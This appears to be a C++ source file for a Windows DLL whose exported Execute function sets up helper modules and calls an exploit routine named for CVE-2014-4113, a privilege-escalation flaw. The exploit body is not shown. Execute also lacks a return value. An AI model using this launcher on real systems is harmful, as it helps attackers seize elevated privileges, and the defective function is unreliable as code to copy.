#include "core\core.h"
#include "core\elevation.h"

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

extern "C"
{

bool WINAPI Execute( void* )
{
	if( !Mem::Init() ) return false;
	if( !Str::Init() ) return false;
	bool ret = Elevation::CVE2014_4113();
	Str::Release();
	Mem::Release();
}

}
